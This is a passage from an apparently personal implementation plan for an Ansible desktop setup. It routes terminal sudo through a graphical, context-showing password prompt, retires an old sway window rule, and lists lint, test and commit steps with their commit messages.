strictly better than anything the /proc walk could recover here: polkit's agent
API has no subject parameter at all, so ancestry names cmd-polkit rather than
whatever actually asked."
```

---

### Task 5: Route interactive sudo to the box

**Files:**
- Create: `roles/system/tasks/sudo_function.yml`
- Modify: `roles/system/tasks/core.yml` or `rest.yml` (include it — match where
  `sudo.yml` is already included)

**Interfaces:**
- Consumes: `gatherd-askpass` from Task 2, `wayprompt` from Task 3.
- Produces: nothing downstream.

- [ ] **Step 1: Write the task file**

Create `roles/system/tasks/sudo_function.yml`:

```yaml
---
# /etc/bash.bashrc, not /etc/profile.d: a foot window spawns a NON-LOGIN
# interactive bash, which reads bash.bashrc and never sources profile.d. This
# is the same class of delivery-mechanism trap documented in user_path.yml,
# where environment.d silently never reached the sway session.
#
# Guarded on WAYLAND_DISPLAY so a TTY or an inbound SSH session gets sudo's own
# prompt. wayprompt does ship a TUI fallback, but it is not worth depending on
# here: on a TTY the context is already on screen -- you typed the command, and
# the prompt appears inline in the shell that ran it. The context line exists
# for prompts you did not expect.
- name: Route interactive sudo through the graphical prompt
  ansible.builtin.blockinfile:
    path: /etc/bash.bashrc
    block: |
      sudo() {
          if [ -n "$WAYLAND_DISPLAY" ]; then
              command sudo -A "$@"
          else
              command sudo "$@"
          fi
      }
    marker: "# {mark} ANSIBLE MANAGED BLOCK: gatherd sudo prompt"
  notify: Etckeeper commit
```

- [ ] **Step 2: Lint**

```bash
ansible-lint
```
Expected: no new findings.

- [ ] **Step 3: Apply and verify both branches**

```bash
sudo ansible-playbook site-async.yml --tags system 2>&1 | tail -5
```

Then in a **new** foot window (the function is read at shell start):

```bash
sudo -k; sudo id -u
```
Expected: the crimson box appears reading `elevating: id -u` and
`requested by foot`; typing the password prints `0`.

```bash
sudo -k; env -u WAYLAND_DISPLAY bash -c 'sudo id -u'
```
Expected: sudo's own `[sudo] password for schmonz:` prompt in the terminal, no
box. This is the branch that keeps a TTY and inbound SSH working.

```bash
sudo -k; command sudo id -u
```
Expected: the tty prompt — the escape hatch still works.

- [ ] **Step 4: Commit**

```bash
git add roles/system/tasks/sudo_function.yml roles/system/tasks/
git commit -m "Bring terminal sudo into the prompt family

Typing sudo at a foot prompt got sudo's tty prompt while everything else got
the crimson box, so 'the crimson box is what asks for my password' was not
quite true -- which is exactly the ambiguity that makes an unexpected box hard
to judge.

/etc/bash.bashrc rather than /etc/profile.d: a foot window spawns a non-login
interactive bash, which reads bash.bashrc and never sources profile.d. Same
class of trap as environment.d silently never reaching the sway session.

Guarded on WAYLAND_DISPLAY so a TTY or inbound SSH gets sudo's own prompt.
wayprompt's TUI fallback could have covered that, but it is not worth depending
on: on a TTY the context is already on screen, since you typed the command and
the prompt appears in the shell that ran it. Scope stays interactive shells --
command sudo still bypasses, and scripts never source bash.bashrc."
```

---

### Task 6: Retire the old renderers and update the verify step

**Files:**
- Modify: `roles/desktop/tasks/core.yml:673-679`
- Modify: `scripts/gatherd-post-setup-notes` (the credential-prompt `li`)

**Interfaces:**
- Consumes: everything above.
- Produces: nothing.

- [ ] **Step 1: Drop the host-key sway rule**

Delete the "Float the ssh host-key verification prompt" task from
`roles/desktop/tasks/core.yml`. wayprompt draws on layer-shell, so there is no
window for sway to float and the `app_id="gatherd-hostkey-verify"` rule now
matches nothing.

Add a removal task so existing machines converge rather than keeping a stale
line, matching the "Remove obsolete ..." pattern already used in that file:

```yaml
- name: Remove the obsolete ssh host-key float rule
  # gatherd-askpass no longer opens a foot window for this; wayprompt draws on
  # layer-shell, which sway does not tile.
  ansible.builtin.lineinfile:
    path: "{{ target_home }}/.config/sway/config.d/application_defaults"
    regexp: '^for_window \[app_id="gatherd-hostkey-verify"\]'
    state: absent
```

- [ ] **Step 2: Rewrite the credential-prompt verify line**

In `section_verify`, replace the existing `li` beginning `'Credential prompts
wear the crimson house style:` with:

```sh
    li 'Credential prompts wear the crimson house style and say who asked. `sudo -k; sudo id -u` in a NEW terminal pops a crimson box with a salmon border reading `elevating: id -u` and `requested by foot`, in the font from `grep font-regular /etc/wayprompt/config.ini` — typing the password prints `0`, Escape prints nothing and exits non-zero. Context is advisory, not a control, and the box must say so when it has nothing: `/usr/local/bin/gatherd-askpass "[sudo]"` run directly (no privileged parent, so the `/proc/PPID` owner-uid check fails) shows `context unavailable` rather than a fabricated command. Elision is announced: `sudo -k; sudo sh -c "$(printf "printf x\\033[2J")"` shows a line ending `[elided]`. The TTY branch still works: `sudo -k; env -u WAYLAND_DISPLAY bash -c "sudo id -u"` gives sudo'"'"'s own tty prompt with no box, and so does `command sudo id -u`. The ssh host-key decision is the SAME box, not a separate foot window: `/usr/local/bin/gatherd-askpass "Are you sure you want to continue connecting (yes/no/[fingerprint])?"` opens an unmasked three-button prompt (`Yes`/`No`/`Abort`) with the whole prompt legible; `Yes` prints `yes`, `No` prints `no`, `Abort` prints nothing and exits non-zero. Finally `grep -c gatherd-hostkey-verify ~/.config/sway/config.d/application_defaults` prints `0`.'
```

This replaces rather than adds, so the `li` count stays at 12.

- [ ] **Step 3: Lint and regenerate the notes**

```bash
ansible-lint
scripts/gatherd-post-setup-notes && grep -c '^' ~/.config/gatherd-post-setup.md
```
Expected: no new lint findings; the notes regenerate without error.

- [ ] **Step 4: Run both test suites**

```bash
tests/prompt-context && tests/askpass
```
Expected: both print `0 failed` and exit 0.

- [ ] **Step 5: Commit**

```bash
git add roles/desktop/tasks/core.yml scripts/gatherd-post-setup-notes
git commit -m "Retire the foot host-key window

wayprompt draws on layer-shell, so there is no window for sway to float and the
gatherd-hostkey-verify rule matches nothing. Remove it, and remove it from
converged machines rather than leaving a stale line behind.

The verify step is rewritten rather than added to, so the li count stays at 12.
It now checks the parts that are easy to get quietly wrong: that context is
present for a real sudo, that it degrades to 'context unavailable' rather than
a fabricated command when the /proc/PPID owner-uid check fails, that elision is
announced, that the TTY branch still reaches sudo's own prompt, and that the
host-key decision is the same box rather than a separate window."
```

---

## Self-Review

**Spec coverage:** renderer swap → Task 2/3; context line and its three rules →
Task 1; trust levels and the privilege attestation → Task 1 Step 3; polkit message →
Task 4; terminal sudo routing → Task 5; deleted foot/fuzzel paths → Task 2 and
Task 6; wayprompt-missing behaviour → Task 2 Step 3; verify step → Task 6. The
spec's "What a correct API would look like" is reference material with no task,
which is correct — it documents why Task 1 exists.

**Known gap, deliberate:** cmd-polkit's JSON key names are not documented
anywhere I could find, so Task 4 Step 1 captures them live rather than guessing.
That is a real step with a real command, not a placeholder, but it is the one
place the plan cannot state the final code in advance.

**Out of scope, tracked:** git's masked username prompt — `plans/TODO.md`.
